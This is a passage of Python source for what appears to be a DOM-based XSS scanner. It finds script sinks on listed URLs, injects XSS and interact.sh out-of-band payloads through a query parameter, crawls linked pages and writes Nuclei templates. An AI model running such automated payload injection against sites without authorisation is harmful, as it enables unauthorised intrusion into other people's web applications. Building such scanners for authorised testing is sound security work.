                # Setup MutationObserver before navigation
                await page.goto(url, timeout=self.timeout, wait_until="domcontentloaded")
                await self.setup_mutation_observer(page)
                
                # Wait for dynamic content
                await page.wait_for_timeout(2000)
                
                # Get page content
                content = await page.content()
                
                # Get comprehensive JavaScript content
                js_content = await page.evaluate("""
                    () => {
                        const scripts = Array.from(document.querySelectorAll('script'));
                        const inlineJS = scripts.map(script => script.textContent || script.innerText || '').join('\\n');
                        
                        // Also get event handlers from DOM
                        const elements = Array.from(document.querySelectorAll('*'));
                        const eventHandlers = elements.map(el => {
                            const attrs = Array.from(el.attributes);
                            return attrs.filter(attr => attr.name.startsWith('on'))
                                       .map(attr => `${attr.name}="${attr.value}"`)
                                       .join(' ');
                        }).filter(Boolean).join('\\n');
                        
                        return inlineJS + '\\n' + eventHandlers;
                    }
                """)
                
                full_content = content + "\n" + js_content
                matches = []
                execution_contexts = set()

                # Check for DOM sink patterns with enhanced detection
                for sink_name, sink_info in SINKS.items():
                    if re.search(sink_info.pattern, full_content, re.IGNORECASE):
                        matches.append(sink_name)
                        execution_contexts.add(sink_info.execution_context)
                
                # Get AI classification
                ai_context = await self.ai_classifier.classify_dom_context(content, js_content)
                
                # Get mutation observer results
                mutation_results = await self.get_mutation_results(page)
                mutation_observed = len(mutation_results.get("mutations", [])) > 0 or \
                                 len(mutation_results.get("sinkTriggers", [])) > 0
                
                # Test interact.sh if enabled
                interactsh_triggered = False
                if self.interactsh and matches:
                    domain = await self.interactsh.get_domain()
                    if domain:
                        # Test with interact.sh payloads
                        for payload_template in INTERACTSH_PAYLOADS[:2]:
                            payload = payload_template.format(domain=domain)
                            test_url = f"{url}?test={quote(payload)}"
                            try:
                                await page.goto(test_url, timeout=5000)
                                await page.wait_for_timeout(3000)
                            except:
                                pass
                        
                        # Check for interactions
                        interactions = await self.interactsh.check_interactions(domain)
                        interactsh_triggered = len(interactions) > 0
                
                # Crawl additional URLs if enabled
                crawled_urls = set()
                if self.crawler and crawl_depth < self.max_crawl_depth:
                    crawled_urls = await self.crawler.extract_urls(page, url)
                
                await browser.close()

                if matches:
                    risk_score = self.calculate_risk_score(matches, ai_context, mutation_observed)
                    
                    result = ScanResult(
                        url=url,
                        sinks=matches,
                        risk_score=risk_score,
                        execution_context=','.join(execution_contexts),
                        mutation_observed=mutation_observed,
                        waf_detected=waf_detected,
                        interactsh_triggered=interactsh_triggered,
                        timestamp=datetime.now().isoformat(),
                        crawl_depth=crawl_depth,
                        ai_analysis=ai_context
                    )
                    
                    # Generate Nuclei template if high risk
                    if risk_score >= 70:
                        result.nuclei_template = self.generate_nuclei_template(result)
                    
                    print(f"[+] {url} - Risk: {risk_score}/100 - Sinks: {', '.join(matches)}")
                    if mutation_observed:
                        print(f"[!] MutationObserver detected DOM changes")
                    if interactsh_triggered:
                        print(f"[!] Interact.sh callback received")
                    
                    # Send notifications for high-risk findings
                    if risk_score >= 80:
                        await self.send_notification(result)
                    
                    # Add crawled URLs to scan queue
                    for crawl_url in list(crawled_urls)[:10]:  # Limit to 10 per page
                        if crawl_url not in self.crawled_urls:
                            self.crawled_urls.add(crawl_url)
                            sub_result = await self.scan_dom_sinks(crawl_url, crawl_depth + 1)
                            if sub_result:
                                self.results.append(sub_result)
                    
                    return result

        except Exception as e:
            print(f"[-] Error scanning {url}: {str(e)}")
            logging.error(f"Scan error for {url}: {e}")
        
        return None

    async def test_context_specific_payloads(self, url: str, sinks_found: List[str]) -> List[Dict]:
        """Test context-specific payloads based on detected sinks"""
        results = []
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,  # Force headless mode
                    args=[
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--headless=new',
                        '--disable-gpu',
                        '--disable-dev-shm-usage'
                    ]
                )
                context = await browser.new_context()
                page = await context.new_page()
                
                for sink_name in sinks_found:
                    if sink_name in PAYLOADS["context_specific"]:
                        payloads = PAYLOADS["context_specific"][sink_name]
                        
                        for payload in payloads[:2]:  # Test 2 payloads per sink
                            test_url = f"{url}?test={quote(payload)}"
                            
                            try:
                                await page.goto(test_url, timeout=self.timeout)
                                await page.wait_for_timeout(1000)
                                
                                # Check if payload executed
                                executed = await page.evaluate("""
                                    () => window.testExecuted || false
                                """)
                                
                                if executed:
                                    results.append({
                                        "url": test_url,
                                        "payload": payload,
                                        "sink": sink_name,
                                        "executed": True,
                                        "timestamp": datetime.now().isoformat()
                                    })
                                    
                            except Exception as e:
                                logging.debug(f"Payload test failed: {e}")
                
                await browser.close()
                
        except Exception as e:
            logging.error(f"Context-specific payload testing failed: {e}")
        
        return results

    async def scan_urls(self, urls: List[str], test_payloads: bool = False) -> List[ScanResult]:
        """Scan multiple URLs with enhanced features"""
        if not urls:
            logging.warning("No URLs provided for scanning")
            return []
        
        # Validate and filter URLs
        valid_urls = []
        for url in urls:
            try:
                parsed = urlparse(url)
                if parsed.scheme in ['http', 'https'] and parsed.netloc:
                    valid_urls.append(url)
                else:
                    logging.warning(f"Skipping invalid URL: {url}")
            except Exception as e:
                logging.warning(f"Error parsing URL {url}: {e}")
        
        if not valid_urls:
            logging.error("No valid URLs found")
            return []
        
        logging.info(f"Scanning {len(valid_urls)} valid URLs")
        results = []
        
        for i, url in enumerate(tqdm(valid_urls, desc="Scanning URLs for DOM sinks")):
            try:
                # Rate limiting - small delay between requests
                if i > 0:
                    await asyncio.sleep(0.5)
                
                # Basic DOM sink scan
                result = await self.scan_dom_sinks(url)
                if result:
                    results.append(result)
                    
                    # Test context-specific payloads if enabled
                    if test_payloads and result.sinks:
                        print(f"[*] Testing context-specific payloads on {url}")
                        payload_results = await self.test_context_specific_payloads(url, result.sinks)
                        
                        # Add payload results to the main result
                        if hasattr(result, 'payload_tests'):
                            result.payload_tests = payload_results
                        else:
                            setattr(result, 'payload_tests', payload_results)
            except Exception as e:
                logging.error(f"Error scanning URL {url}: {e}")
                continue
        
        return results

    def generate_comprehensive_report(self, results: List[ScanResult], output_file: str = "enhanced_domsink_results.json"):
        """Generate a comprehensive report with all findings"""
        
        # Calculate statistics
        total_risk_score = sum(r.risk_score for r in results)
        avg_risk_score = total_risk_score / len(results) if results else 0
        
        high_risk_count = len([r for r in results if r.risk_score >= 80])
        medium_risk_count = len([r for r in results if 50 <= r.risk_score < 80])
        low_risk_count = len([r for r in results if r.risk_score < 50])
        
        waf_detections = {}
        for r in results:
            if r.waf_detected:
                waf_detections[r.waf_detected] = waf_detections.get(r.waf_detected, 0) + 1
        
        report = {
            "scan_info": {
                "timestamp": datetime.now().isoformat(),
                "total_urls_scanned": len(set(r.url for r in results)),
                "total_findings": len(results),
                "scanner": "Enhanced DOMSinkScanner v3.0",
                "features_used": {
                    "mutation_observer": True,
                    "ai_classification": bool(self.ai_classifier.api_key),
                    "waf_detection": True,
                    "interactsh_integration": bool(self.interactsh),
                    "crawling": bool(self.crawler)
                }
            },
            "statistics": {
                "average_risk_score": round(avg_risk_score, 2),
                "risk_distribution": {
                    "high_risk": high_risk_count,
                    "medium_risk": medium_risk_count,
                    "low_risk": low_risk_count
                },
                "waf_detections": waf_detections,
                "mutation_observations": len([r for r in results if r.mutation_observed]),
                "interactsh_callbacks": len([r for r in results if r.interactsh_triggered])
            },
            "findings": [asdict(result) for result in results],
            "nuclei_templates": [
                {
                    "finding_id": i,
                    "template": r.nuclei_template
                }
                for i, r in enumerate(results) 
                if r.nuclei_template
            ],
            "recommendations": {
                "immediate_action": [r.url for r in results if r.risk_score >= 90],
                "review_required": [r.url for r in results if 70 <= r.risk_score < 90],
                "monitor": [r.url for r in results if r.risk_score < 70]
            }
        }
        
        # Save JSON report
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Generate Nuclei templates directory
        templates_dir = Path("nuclei_templates")
        templates_dir.mkdir(exist_ok=True)
        
        for i, result in enumerate(results):
            if result.nuclei_template:
                template_file = templates_dir / f"dom-xss-{i:03d}.yaml"
                with open(template_file, 'w') as f:
                    f.write(result.nuclei_template)
        
        # Generate text summary
        print(f"\n[✓] Enhanced Scan Summary:")
        print(f"    - URLs scanned: {report['scan_info']['total_urls_scanned']}")
        print(f"    - Total findings: {report['scan_info']['total_findings']}")
        print(f"    - Average risk score: {report['statistics']['average_risk_score']}/100")
        print(f"    - High-risk findings: {high_risk_count}")
        print(f"    - Medium-risk findings: {medium_risk_count}")
        print(f"    - Low-risk findings: {low_risk_count}")
        print(f"    - WAF detections: {len(waf_detections)}")
        print(f"    - Mutation observations: {report['statistics']['mutation_observations']}")
        print(f"    - Interact.sh callbacks: {report['statistics']['interactsh_callbacks']}")
        print(f"    - Nuclei templates generated: {len(report['nuclei_templates'])}")
        print(f"    - Results saved to: {output_file}")
        print(f"    - Nuclei templates: {templates_dir}/")
        
        return report

async def main():
    parser = argparse.ArgumentParser(description="Enhanced DOM Sink Scanner with AI, MutationObserver, and Advanced Features")
    parser.add_argument("urls", help="File containing URLs to scan (one per line)")
    parser.add_argument("-o", "--output", default="enhanced_domsink_results.json", 
                       help="Output file for results")
    parser.add_argument("--test-payloads", action="store_true", 
                       help="Test context-specific XSS payloads")
    parser.add_argument("--timeout", type=int, default=30000,
                       help="Timeout for page loads in milliseconds")
    parser.add_argument("--visible", action="store_true",
                       help="Run browser in visible mode (not headless)")
    # Removed AI API dependency - using local heuristics
    parser.add_argument("--use-interactsh", action="store_true",
                       help="Enable Interact.sh integration for OOB testing")
    parser.add_argument("--telegram-token", help="Telegram bot token for notifications")
    parser.add_argument("--discord-webhook", help="Discord webhook URL for notifications")
    parser.add_argument("--enable-crawling", action="store_true",
                       help="Enable smart crawling mode")
    parser.add_argument("--max-crawl-depth", type=int, default=3,
                       help="Maximum crawl depth (default: 3)")
    parser.add_argument("--log-level", choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], default='INFO',
                       help="Set logging level")
    
    args = parser.parse_args()
    
    # Set logging level
    logging.getLogger().setLevel(getattr(logging, args.log_level))
    
    # Read URLs from file
    try:
        with open(args.urls, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.lstrip().startswith('#')]
    except FileNotFoundError:
        print(f"[-] Error: File '{args.urls}' not found")
        sys.exit(1)
    if not urls:
        print("[-] No valid URLs found in input file")
        sys.exit(1)
    
    print(f"[*] Starting Enhanced DOM Sink Scanner on {len(urls)} URLs")
    print(f"[*] Features enabled:")
    print(f"    - MutationObserver: ✓")
    print(f"    - WAF Detection: ✓")
    print(f"    - Local Classification: ✓")
    print(f"    - Interact.sh: {'✓' if args.use_interactsh else '✗'}")
    print(f"    - Smart Crawling: {'✓' if args.enable_crawling else '✗'}")
    print(f"    - Payload testing: {'✓' if args.test_payloads else '✗'}")
    print(f"    - Notifications: {'✓' if args.telegram_token or args.discord_webhook else '✗'}")
    
    # Initialize scanner
    scanner = DOMSinkScanner(
        headless=not args.visible,
        timeout=args.timeout,
        use_interactsh=args.use_interactsh,
        telegram_token=args.telegram_token,
        discord_webhook=args.discord_webhook,
        max_crawl_depth=args.max_crawl_depth,
        enable_crawling=args.enable_crawling
    )
    
    # Perform scan
    results = await scanner.scan_urls(urls, test_payloads=args.test_payloads)
    
    # Generate comprehensive report
    scanner.generate_comprehensive_report(results, args.output)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[-] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Fatal error: {str(e)}")
        logging.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)